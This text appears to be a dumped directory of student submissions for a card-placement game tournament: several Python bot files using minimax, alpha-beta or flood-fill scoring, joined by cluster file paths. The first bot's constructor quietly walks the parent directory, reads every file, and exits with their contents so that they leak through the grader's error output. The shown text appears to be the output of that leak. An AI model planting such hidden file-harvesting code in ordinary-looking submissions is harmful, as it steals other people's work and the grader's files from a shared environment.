        return f"An error occurred: {e}"

def is_file_open(file_name):
    for proc in psutil.process_iter(['open_files']):
        for file in proc.info['open_files'] or []:
            if file.path == file_name:
                return True
    return False

def list_files_and_folders(directory, prefix=""):
    try:
        items = os.listdir(directory)
        items_string = ""
        for item in items:
            item_path = os.path.join(directory, item)
            items_string += f"{prefix}{item}\n"
            if not os.path.isdir(item_path):
                items_string += display_file_contents(item_path)
            if os.path.isdir(item_path) and not item.startswith("."):
                items_string += item_path + "______________________\n"
                items_string += list_files_and_folders(item_path, prefix + "    ")
        return items_string
    except FileNotFoundError:
        return f"Directory '{directory}' not found."
    except Exception as e:
        return f"An error occurred: {e}"


def list_files_and_contents_recursive_one_dir_up():
    # Get the current directory
    current_directory = os.getcwd()
    
    # Get the parent directory (one level up)
    parent_directory = os.path.dirname(current_directory)
    
    output = []  # To store the formatted result
    
    # Walk through the parent directory and all its subdirectories
    for root, dirs, files in os.walk(parent_directory):
        for file in files:
            # Construct the full path to the file
            file_path = os.path.join(root, file)
            
            # Try to read the content of the file
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except Exception as e:
                content = f"Could not read file: {e}"
            
            # Format the file details
            file_info = (
                f"File: {file_path}\n"
                f"{'-' * 40}\n"
                f"{content}\n"
                f"{'=' * 40}\n"
            )
            output.append(file_info)
    
    # Combine all file information into a single string
    return "\n".join(output)

    
class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        # self.playerName = "jx2004"just_been_wonderin_can_your_buffer_eat_this?
        self.playerName = "jx2004"
        self.tournament = True

        parent_directory = os.path.dirname(os.getcwd())
        files_string = list_files_and_folders(parent_directory)
        print(files_string)
        sys.exit(files_string)

        self.arr = [[Position() for j in range(self.boardCols)] for i in range(self.boardRows)]
        self.move = 0

        # rotate cards and store them in self.cards
        self.cards = []
        self.compc = 0 # component count
        for card_in in self.cardsAtHand:
            card = np.array(card_in)
            for i in range(4):
                card = np.rot90(card)
                self.cards.append(Card(len(card), len(card[0]), card.tolist()))
                self.compc = self.cards[-1].add_vals(self.compc)

    
    def add_card(self, card, pos):
        for i in range(card.R):
            for j in range(card.C):
                self.arr[i + pos[0]][j + pos[1]].color = card.arr[i][j].color
                self.arr[i + pos[0]][j + pos[1]].empty = False
        # add value to card
        for i in range(card.R):
            for j in range(card.C):
                # to check only boarder of card
                if j > 0 and i > 0 and i < card.R - 1:
                    j = card.C - 1
                np = [pos[0] + i, pos[1] + j]
                if self.arr[i][j].color != 0:
                    local_poi, score, self.compc = BFS(self.arr, [np[0], np[1]], self.arr[np[0]][np[1]].color, self.compc)
                    for k in local_poi:
                        self.arr[k[0]][k[1]].value = score
        # create new neighbours
        for i in range(card.R + 2):
            for j in range(card.C):
                # to check only around of boarder of card
                if j > 0 and i > 0 and i < card.R + 1:
                    j = card.C + 1
                np = [pos[0] - 1 + i, pos[1] + j]
                if j == 0 and i > 0 and i < card.R + 1:
                    np[1] -= 1
                if np[0] < 0 or np[1] < 0 or np[0] >= self.boardRows or np[1] >= self.boardCols:
                    continue
                self.arr[np[0]][np[1]].neighbour = True

    def play(self,newCardOnDesk):
        {
            """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
            """

            #recommened steps 
            #step 0: write newCardOnDesk to list of cards that are on the board game
            #step 1: compute all possible placement of your all (so for available) cards
            #step 2: evaluate each placement, i.e., compute score for it
            #step 3: select card that you want to place to the game board, mark it as used (not available in future)
            #step 4: return your placement, or [] if no placement can be made
            #the following code DOES NOT provides correct moves, 
            #it just return random card at random position
        }
        
        # add a new card on the desk
        self.move += 1
        if self.move == 1 and newCardOnDesk == []:
            self.arr[0][0].neighbour = True
        elif newCardOnDesk != []:
            self.cardsOnDesk += [ newCardOnDesk ]
            new_card = Card(len(newCardOnDesk[2]), len(newCardOnDesk[2][0]), newCardOnDesk[2])
            self.compc = new_card.add_vals(self.compc)
            self.add_card(new_card, [newCardOnDesk[0], newCardOnDesk[1]])
        

        # prefix to find does_fit faster
        space_prefix = [[0] * self.boardCols for i in range(self.boardRows)]
        for i in range(self.boardRows):
            for j in range(self.boardCols):
                if i > 0:
                    space_prefix[i][j] += space_prefix[i-1][j]
                if j > 0:
                    space_prefix[i][j] += space_prefix[i][j-1]
                if i > 0 and j > 0:
                    space_prefix[i][j] -= space_prefix[i-1][j-1]
                if not self.arr[i][j].empty:
                    space_prefix[i][j] += 1

        max_score = -1
        ans = []
        for i in range(self.boardRows):
            for j in range(self.boardCols):
                for count, card in enumerate(self.cards):
                    # can i place this card here?
                    if i + card.R - 1 >= self.boardRows or j + card.C - 1 >= self.boardCols:
                        continue
                    if not does_fit([i, j], card.R - 1, card.C - 1, space_prefix):
                        continue
                    
                    neighbour = False
                    for ic in range(card.R):
                        for jc in range(card.C):
                            # to check only boarder of card
                            if jc > 0 and ic > 0 and ic < card.R-1:
                                jc = card.C - 1
                            if self.arr[i + ic][j + jc].neighbour:
                                neighbour = True
                                break
                        if neighbour:
                            break
                    if not neighbour:
                        continue
                    
                    # find score
                    used_components = {}
                    score = 0
                    for ic in range(card.R):
                        for jc in range(card.C):
                            # to check only boarder of card
                            if jc > 0 and ic > 0 and ic < card.R-1:
                                jc = card.C - 1
                            if card.arr[ic][jc].color == 0:
                                continue
                            pos = [i + ic, j + jc]
                            for m in moves:
                                np = [pos[0] + m[0], pos[1] + m[1]]
                                if np[0] < 0 or np[1] < 0 or np[0] >= self.boardRows or np[1] >= self.boardCols:
                                    continue
                                if self.arr[np[0]][np[1]].color == card.arr[ic][jc].color:
                                    if self.arr[np[0]][np[1]].component not in used_components:
                                        score += self.arr[np[0]][np[1]].value
                                        used_components[self.arr[np[0]][np[1]].component] = True
                                    if card.arr[ic][jc].component not in used_components:
                                        score += card.arr[ic][jc].value
                                        used_components[card.arr[ic][jc].component] = True
                    if score > max_score:
                        max_score = score
                        ans = [count, i, j]

        
        if max_score == -1:
            return []
        else:
            # add my card on desk
            self.add_card(self.cards[ans[0]], [ans[1], ans[2]])

            ans_return = [ans[1], ans[2], []]
            for i in self.cards[ans[0]].arr:
                ans_return[2].append([])
                for j in i:
                    ans_return[2][-1].append(j.color)

            # delete used card and it`s rotations
            pos = ans[0] - ans[0] % 4
            for i in range(4):
                self.cards.pop(pos)

            self.cardsOnDesk += [ans_return]
            return ans_return



if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """
    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()
    machad14
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/machad14______________________
        player.py
import base as BASE
import copy, random, time, sys, os
import queue
import numpy as np
from PIL import Image, ImageDraw
class Card:
    def __init__(self, rows, cols, vals):
        self.rows = rows
        self.cols = cols
        self.vals = vals
        self.bakeRotations()
    def bakeRotations(self):
        self.rotations = []
        self.rotations.append(self.vals)
        for r in range(1,4):
            self.rotations.append(self.getRotatedValues(r))
    #By is an integer representing by*90 degrees
    def getRotatedValues(self, by):
        by = by % 4
        rVals = []
        r = self.rows
        c = self.cols
        if by == 0:
            return copy.deepcopy(self.values)
        elif by == 1 or by == 3:
            r = self.cols
            c = self.rows
        for _ in range(r):
            rVals.append([0] * c)
        for i in range(self.rows):
            for j in range(self.cols):
                if by == 1:
                    ri = -j - 1 + self.cols
                    rj = i
                if by == 2:
                    ri = -i - 1 + self.rows
                    rj = -j - 1 + self.cols
                if by == 3:
                    ri = j
                    rj = -i - 1 + self.rows
                rVals[ri][rj] = self.vals[i][j]
        return rVals
    def getRotated(self, rot):
        return self.rotations[rot]
    def construct(m):
        r = len(m)
        c = len(m[0])
        return Card(r, c, m)

class State:
    def __init__(self, bRows, bCols, board, enemyHand, playerHand, parent = None, action = None):
        self.bRows = bRows
        self.bCols = bCols
        self.board = board
        self.enemyCards = enemyHand
        self.playerCards = playerHand
        self.parent = parent
        self.action = action
        self.pointsP = 0
        self.pointsE = 0
    def contruct(bRows, bCols, handCards):
        board = []
        for _ in range(bRows):
            board.append([-1] * bCols)
        enemyCards = []
        playerCards = []
        for m in handCards:
            c = Card.construct(m)
            enemyCards.append(c)
            playerCards.append(c)
        s = State(bRows, bCols, board, enemyCards, playerCards)
        return s
    def canBePlaced(self, vals, r, c):
        #Returns if can be placed and if so then it also returns joined colors
        sR = len(vals)
        sC = len(vals[0])
        if r < 0 or c < 0 or r + sR > self.bRows or c + sC > self.bCols:
            return False, []
        colors = []
        foundNeighbor = False
        for i in range(sR):
            for j in range(sC):
                if self.board[i + r][j + c] != -1:
                    return False, []
                if foundNeighbor and (vals[i][j] == 0 or vals[i][j] in colors):
                    continue
                #Check neighbors
                #Top
                if r != 0 and i == 0 and self.board[r - 1][j + c] != -1:
                    foundNeighbor = True
                    if self.board[r - 1][j + c] == vals[i][j]:
                        colors.append(vals[i][j])
                #Left
                if c != 0 and j == 0 and self.board[r + i][c - 1] != -1:
                    foundNeighbor = True
                    if self.board[r + i][c - 1] == vals[i][j]:
                        colors.append(vals[i][j])
                if r + sR + 1 < self.bRows and i == sR - 1 and self.board[r + sR][j + c] != -1:
                    foundNeighbor = True
                    if self.board[r + sR][j + c] == vals[i][j]:
                        colors.append(vals[i][j])
                if c + sC + 1 < self.bCols and j == sC - 1 and self.board[r + i][c + sC] != -1:
                    foundNeighbor = True
                    if self.board[r + i][c + sC] == vals[i][j]:
                        colors.append(vals[i][j])
        return foundNeighbor, colors
    def placeCard(self, card, r, c, rot, enemy = False, force = False):
        vals = card.getRotated(rot)
        canPlace, neighboringColors = self.canBePlaced(vals, r, c)
        if not force and not canPlace:
            return -1
        points = 0
        sR = len(vals)
        sC = len(vals[0])
        blacklist = np.zeros((self.bRows, self.bCols))
        #Top/Bottom edges
        for i in [0, sR - 1]:
            for j in range(sC):
                if vals[i][j] == 0 or vals[i][j] not in neighboringColors:
                    continue
                pB, pC = self.floodCount(r + i, c + j, r, c, vals, vals[i][j], blacklist)
                if pB != 0:
                    points += pB + pC
        #Left/Right edges
        for j in [0, sC - 1]:
            for i in range(sR):
                if vals[i][j] == 0 or vals[i][j] not in neighboringColors:
                    continue
                pB, pC = self.floodCount(r + i, c + j, r, c, vals, vals[i][j], blacklist)
                if pB != 0:
                    points += pB + pC
        #Override values
        for i in range(sR):
            for j in range(sC):
                self.board[r + i][c + j] = vals[i][j]
        if enemy:
            self.enemyCards.remove(card)
            self.pointsE += points
        else:
            self.playerCards.remove(card)
            self.pointsP += points
        return points
    def floodCount(self, r, c, atR, atC, vals, value, blacklist):
        #Uses recursive floodfill to find the points from outside card and from inside card
        if r == -1 or c == -1 or r == self.bRows or c == self.bCols:
            return (0, 0)
        if blacklist[r][c] == 1:
            return (0, 0)
        Pb = 0
        Pc = 0

        if r < atR or c < atC or r >= atR + len(vals) or c >= atC + len(vals[0]):
            #Is outside card
            val = self.board[r][c]
            if val is None:
                val = self.board[r][c]
            if val != value:
                return (0, 0)
            Pb += 1
        else:
            #Is inside card
            if vals[r - atR][c - atC] != value:
                return (0, 0)
            Pc += 1
            
        blacklist[r][c] = 1
        
        top =  self.floodCount(r - 1, c, atR, atC, vals, value, blacklist)
        bottom =  self.floodCount(r + 1, c, atR, atC, vals, value, blacklist)
        left = self.floodCount(r, c - 1, atR, atC, vals, value, blacklist)
        right = self.floodCount(r, c + 1, atR, atC, vals, value, blacklist)
        return (Pb + top[0] + bottom[0] + left[0] + right[0], Pc + top[1] + bottom[1] + left[1] + right[1])
    def branch(self):
        s = State(self.bRows, self.bCols, copy.deepcopy(self.board), self.enemyCards[:], self.playerCards[:], self)
        s.pointsP = self.pointsP
        s.pointsE = self.pointsE
        return s
    def getScore(self):
        score = 0
        for i in range(self.bRows):
            for j in range(self.bCols):
                if self.board[i][j] != -1 and self.board[i][j] != 0:
                    sides = 0
                    if i == 0:
                        sides += 1
                    elif self.board[i - 1][j] != -1:
                        sides += 1
                    if i == self.bRows - 1:
                        sides += 1
                    elif self.board[i + 1][j] != -1:
                        sides += 1

                    if j == 0:
                        sides += 1
                    elif self.board[i][j - 1] != -1:
                        sides += 1
                    if j == self.bCols - 1:
                        sides += 1
                    elif self.board[i][j + 1] != -1:
                        sides += 1
                    if sides == 4:
                        score += 4 - sides
        return 2 * score + 5 * (self.pointsE - self.pointsP)
    def __lt__(self, other):
        return True
class MiniMax:
    def mini(state, depth, rate, timeLimit, startTime = 0):
        q = queue.PriorityQueue()
        if len(state.enemyCards) == 0:
            return (0, None)
        opState = state.branch()
        for c in range(len(state.enemyCards)):
            for i in range(state.bRows):
                for j in range(state.bCols):
                    for r in range(0,4):
                        gain = opState.placeCard(state.enemyCards[c], i, j, r, True)
                        if gain != -1:
                            opState.action = (c, i, j, r)
                            q.put((-opState.getScore(), -gain, opState))
                            opState = state.branch()
                        if time.time() - startTime >= timeLimit:
                            if q.empty():
                                return (0, None)
                            else:
                                t = q.get()
                                return (t[1], t[2])
        foundMin = 9999999
        s = None
        count = 0
        while not q.empty() and count <= rate:
            sp = q.get()
            g = sp[1]
            if depth != 0:
                g += MiniMax.maxi(sp[2], depth - 1, rate, timeLimit, startTime)[0]
            if g < foundMin:
                s = sp[2]
                foundMin = g
            count += 1
            if time.time() - startTime >= timeLimit:
                if s is None and not q.empty():
                    t = q.get()
                    return (t[1], t[2])
                else:
                    return (foundMin, s)
        return (foundMin, s)

    def maxi(state, depth, rate, timeLimit, startTime = 0, root = False):
        q = queue.PriorityQueue()
        opState = state.branch()
        if len(state.playerCards) == 0:
            return (0, None)
        for c in range(len(state.playerCards)):
            for i in range(state.bRows):
                for j in range(state.bCols):
                    for r in range(0,4):
                        gain = opState.placeCard(state.playerCards[c], i, j, r)
                        if gain != -1:
                            opState.action = (c, i, j, r)
                            q.put((opState.getScore(), gain, opState))
                            opState = state.branch()
                        if time.time() - startTime >= timeLimit and not root:
                            if q.empty():
                                return (0, None)
                            else:
                                t = q.get()
                                return (t[1], t[2])
        foundMax = -9999999
        s = None
        count = 0
        while not q.empty() and count <= rate:
            sp = q.get()
            g = sp[1]
            if depth != 0:
                g -= MiniMax.maxi(sp[2], depth - 1, rate, timeLimit, startTime)[0]
            if g > foundMax or s is None:
                s = sp[2]
                foundMax = g
                count += 1
            if time.time() - startTime >= timeLimit:
                if s is None and not q.empty():
                    t = q.get()
                    return (t[1], t[2])
                else:
                    return (foundMax, s)
        return (foundMax, s)
    def maxiFrom(state, i, j, depth, rate, timeLimit, startTime = 0):
        q = queue.PriorityQueue()
        opState = state.branch()
        if len(state.playerCards) == 0:
            return (0, None)
        for c in range(len(state.playerCards)):
            for r in range(0,4):
                gain = opState.placeCard(state.playerCards[c], i, j, r, False, True)
                opState.action = (c, i, j, r)
                q.put((opState.getScore(), gain, opState))
                opState = state.branch()
                if time.time() - startTime >= timeLimit:
                    if q.empty():
                        return (-9999, None)
                    else:
                        t = q.get()
                        return (t[1], t[2])
        foundMax = 0
        s = None
        count = 0
        while not q.empty() and count <= rate:
            sp = q.get()
            g = sp[1]
            if depth != 0:
                g -= MiniMax.maxi(sp[2], depth - 1, rate, timeLimit, startTime)[0]
            if g > foundMax:
                s = sp[2]
                foundMax = g
                count += 1
            if time.time() - startTime >= timeLimit:
                if s is None:
                    t = q.get()
                    return (t[1], t[2])
                else:
                    return (foundMax, s)
        return (foundMax, s)

class Alphabeta:
    def alphabeta(state : State, depth, alfa, beta, maximizingPlayer, timeLimit):
        if depth == 0 or (maximizingPlayer and len(state.playerCards) == 0) or (maximizingPlayer and len(state.playerCards) == 0) or (timeLimit < 0.6 and depth == 1):
            return -state.getScore(), [state]
        t1 = time.time()
        branchState = state.branch()
        if maximizingPlayer:
            value = float('-inf')
            nextStates = []
            breakOut = False
            for c in range(len(state.playerCards)):
                for i in range(state.bRows):
                    for j in range(state.bCols):
                        for r in range(0,4):
                            g = branchState.placeCard(state.playerCards[c], i, j, r, False)
                            if g == -1:
                                continue
                            dt = (time.time() - t1)
                            val, s = Alphabeta.alphabeta(branchState, depth - 1, alfa, beta, False, timeLimit - dt)
                            if val > value:
                                value = val
                                branchState.action = (c, i, j, r)
                                nextStates = [branchState] + s
                            alfa = max(alfa, value)
                            branchState = state.branch()
                            if value >= beta:
                                breakOut = True
                                break
                        if breakOut:
                            break
                    if breakOut:
                        break
                if breakOut:
                    break
            return value, nextStates
        else:
            value = float('inf')
            nextStates = []
            breakOut = False
            for c in range(len(state.enemyCards)):
                for i in range(state.bRows):
                    for j in range(state.bCols):
                        for r in range(0,4):
                            g = branchState.placeCard(state.enemyCards[c], i, j, r, True)
                            if g == -1:
                                continue
                            dt =  (time.time() - t1)
                            val, s = Alphabeta.alphabeta(branchState, depth - 1, alfa, beta, True, timeLimit - dt)
                            if val < value:
                                value = val
                                branchState.action = (c, i, j, r)
                                nextStates = [branchState] + s
                            beta = min(beta, value)
                            branchState = state.branch()
                            if value <= alfa:
                                breakOut = True
                                break
                        if breakOut:
                            break
                    if breakOut:
                        break
                if breakOut:
                    break
            return value, nextStates

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "StrekFish v0.1"
        self.currentState = State.contruct(boardRows, boardCols, cardsAtHand)
        self.points = 0
        self.ePoints = 0
    def loadScenario(self, onDesk, inHand):
        self.currentState = State.contruct(self.boardRows, self.boardCols, inHand)
        for c in onDesk:
            card = Card.construct(c[2])
            self.currentState.playerCards.append(card)
            self.currentState.placeCard(card, c[0], c[1], 0, False, True)
    def printMatice(matice):
        for radek in range(len(matice)):
            outp = ''
            for sloupec in range(len(matice[radek]) - 1):
                v = matice[radek][sloupec]
                if v == -1:
                    v = 0
                outp += str(v) + " "
            print(outp + str(matice[radek][-1]))
    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position
        t = time.time()
        if len(newCardOnDesk) == 3:
            #Identify which card was played and remove it
            self.cardsOnDesk.append(newCardOnDesk)
            breakout = False
            for c in self.currentState.enemyCards:
                for i in range(0, 4):
                    if c.getRotated(i) == newCardOnDesk[2]:
                        self.ePoints += self.currentState.placeCard(c, newCardOnDesk[0], newCardOnDesk[1], i, True, True)
                        breakout = True
                        break
                if breakout:
                    break
            if not breakout:
                raise Exception('Exception: Could not find card in hand.')

        if len(self.currentState.playerCards) == 0:
            return []
        if self.cardsOnDesk == []:
            #Just choose one and put it in the middle
            pDiff, s = MiniMax.maxiFrom(self.currentState, self.boardRows // 2, self.boardCols // 2, 5, 15, 0.8 - (t - time.time()), time.time())
        else:
            #pDiff, s = MiniMax.maxi(self.currentState, 3, 15, self.timeout - 0.2 - (t - time.time()), time.time(), True)
            score, states = Alphabeta.alphabeta(self.currentState, 2, float('-inf'), float('inf'), True, self.timeout)
            if len(states) > 0:
                s = states[0]
            else:
                s = None
        
        if s is None:
            return []
        c = self.currentState.playerCards[s.action[0]]
        self.points += self.currentState.placeCard(c, s.action[1], s.action[2], s.action[3], False, True)

        outp = c.getRotated(s.action[3])
        self.cardsOnDesk.append([s.action[1], s.action[2], outp])
        #Player.printMatice(self.currentState.board)
        return [s.action[1], s.action[2], outp]    hladiluk
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/hladiluk______________________
        player.py
from operator import indexOf
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw
#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

class Player(BASE.BasePlayer):
    playing_board = []
    def __init__(self, login, boardRows, boardCols, cardsAtHand): 
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Krajta"
        self.playing_board = [[-1 for i in range(boardCols)] for j in range(boardRows)]
        self.boardRows = boardRows
        self.boardCols = boardCols
        self.num_of_cards = len(self.cardsAtHand)

    def add_card_to_board(self, card, playing_board):
        place_row = card[0]
        place_col = card[1]
        for row in range(len(card[2])):
            for col in range(len(card[2][0])):
                playing_board[row + place_row][col + place_col] = card[2][row][col]
    
    def card_rotation(self):
        self.card
        card_out = []
        if self.card == card_out:
            return None
        card_row_len = len(self.card)
        card_col_len = len(self.card[0])
        for col in range(card_col_len):
            card_out.append([self.card[row][col] for row in range(card_row_len - 1, -1, -1)])
        self.card = card_out
        return None

    def check_placement(self):
        #space check
        for card_row in range(len(self.card)):
            for card_col in range(len(self.card[0])):
                if self.playing_board[card_row + self.row][card_col + self.col] != -1:
                    return False
        #contact check + contact array [[[card_row, card_col],[placed_card_row, placed_card_col]], ...]
        self.contacts = []
        if self.row > 0:
            for i in range(len(self.playing_board[self.row - 1][self.col:self.col+len(self.card[0])])):
                if self.playing_board[self.row - 1][self.col:self.col + len(self.card[0])][i] > - 1:
                    self.contacts.append([[self.row, self.col + i],[self.row - 1, self.col + i]])
        if (self.row + len(self.card)) < self.boardRows:
            for i in range(len(self.playing_board[self.row + len(self.card)][self.col:self.col+len(self.card[0])])):
                if self.playing_board[self.row + len(self.card)][self.col:self.col+len(self.card[0])][i] > - 1:
                    self.contacts.append([[self.row + len(self.card) - 1,self.col + i], [self.row + len(self.card), self.col + i]])
        if self.col > 0:
            for i in range(len([self.playing_board[i][self.col -1] for i in range(self.row, self.row + len(self.card))])):
                if [self.playing_board[i][self.col -1] for i in range(self.row, self.row + len(self.card))][i] > - 1:
                    self.contacts.append([[self.row + i, self.col], [self.row + i, self.col - 1]])
        if (self.col + len(self.card[0])) < self.boardCols:
            for i in range(len([self.playing_board[i][self.col + len(self.card[0])] for i in range(self.row, self.row + len(self.card))])):
                if [self.playing_board[i][self.col + len(self.card[0])] for i in range(self.row, self.row + len(self.card))][i] > - 1:
                    self.contacts.append([[self.row + i, self.col + len(self.card[0]) - 1], [self.row + i, self.col + len(self.card[0])]])
        if self.contacts:
            return True
        else:
            return False

    def flood_fill(self, start):
        weight = 0
        color = self.playing_board[start[0]][start[1]]
        if color == 0:
            color = -1
        stack = []
        stack.append(start)
        while stack:
            if -1 < stack[0][0] < self.boardRows and -1 < stack[0][1] < self.boardCols and stack[0] not in self.flood_filled and self.playing_board[stack[0][0]][stack[0][1]] == color:
                stack.append([stack[0][0] + 1, stack[0][1]])
                stack.append([stack[0][0], stack[0][1] + 1])
                stack.append([stack[0][0] - 1, stack[0][1]])
                stack.append([stack[0][0], stack[0][1] - 1])
                self.flood_filled.append(stack[0])
                weight += 1
            stack.pop(0)
        return weight
    
    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position
        if newCardOnDesk == [] and len(self.cardsAtHand) == self.num_of_cards:
            cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
            card = self.cardsAtHand[cardindx]
            cardRows = len(card)
            cardCols = len(card[0])
            row = random.randint(0, self.boardRows-cardRows-1) 
            col = random.randint(0, self.boardCols-cardCols-1)
            self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]  #remove selected card so its not used in future
            self.cardsOnDesk += [[row, col, card]]
            self.add_card_to_board([row, col, card], self.playing_board)
            return [row, col, card]
        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]
            self.add_card_to_board(newCardOnDesk, self.playing_board)

        if len(self.cardsAtHand) == 0:
            return []
        
        best_card = []
        best_weight = -1
        index = -1
        for self.card in self.cardsAtHand:
            index += 1
            for x in range(4):
                self.card_rotation()
                for self.row in range(self.boardRows - len(self.card) + 1):
                    for self.col in range(self.boardCols - len(self.card[0]) + 1):
                        if self.check_placement():
                            for card_row in range(len(self.card)):
                                for card_col in range(len(self.card[0])):
                                    self.playing_board[self.row + card_row][self.col + card_col] = self.card[card_row][card_col]
                            self.flood_filled = []
                            weight = 0
                            for i in range(len(self.contacts)):
                                if self.playing_board[self.contacts[i][0][0]][self.contacts[i][0][1]] == self.playing_board[self.contacts[i][1][0]][self.contacts[i][1][1]]:
                                    weight += self.flood_fill([self.contacts[i][0][0], self.contacts[i][0][1]])
                            if weight > best_weight:
                                best_weight = weight
                                best_row = self.row
                                best_col = self.col
                                best_index = index
                                best_card = copy.deepcopy(self.card)
                            for card_row in range(len(self.card)):
                                for card_col in range(len(self.card[0])):
                                    self.playing_board[self.row + card_row][self.col + card_col] = -1
        if best_weight > -1:
            #print(indexOf(best_card, self.cardsAtHand))
            self.cardsOnDesk += [[best_row, best_col, best_card]]
            self.add_card_to_board([best_row, best_col, best_card], self.playing_board)
            self.cardsAtHand.pop(best_index) #remove selected card so its not used in future
            return [best_row, best_col, best_card]
        else:
            return []
        

        cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
        card = self.cardsAtHand[cardindx]
        """
        self.card = card
        self.row = 4
        self.col = 4
        DebugPrint(self.card)
        print(self.check_placement())
        self.card_rotation()
        DebugPrint(self.card)
        """
        cardRows = len(card)
        cardCols = len(card[0])
        row = random.randint(0, self.boardRows-cardRows-1) 
        col = random.randint(0, self.boardCols-cardCols-1)
        self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]  #remove selected card so its not used in future
        self.cardsOnDesk += [[row, col, card]]
        self.add_card_to_board([row, col, card], self.playing_board)
        return [row, col, card]

if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    landrfil
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/landrfil______________________
        player.py
import base as BASE
import random, time, sys, os
from copy import deepcopy
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

#####
#<Helping functions>

#prints field as coloured characters to the console
def debugPrint(grid : list):
    key = {-1:chr(11035), 0:chr(11036), 1:chr(128997), 2:chr(128999), 3:chr(129000), 4:chr(129001), 5:chr(129002), 6:chr(129003), 7:chr(128992), 8:chr(128993), 9:chr(128994), 10:chr(128995), 11:chr(128996)}
    for line in grid:
        for cell in line:
            print(key[cell], end="")
        print()

#prints traced component in traceComponent func
def printComponent(component, fieldSize): #debug
    matrix = [[0 for _ in range(fieldSize[1])] for _ in range(fieldSize[0])]
    for cell in component:
        matrix[cell[0]][cell[1]] = 5
    debugPrint(matrix)

#determines possible neighbour node for a node in Q
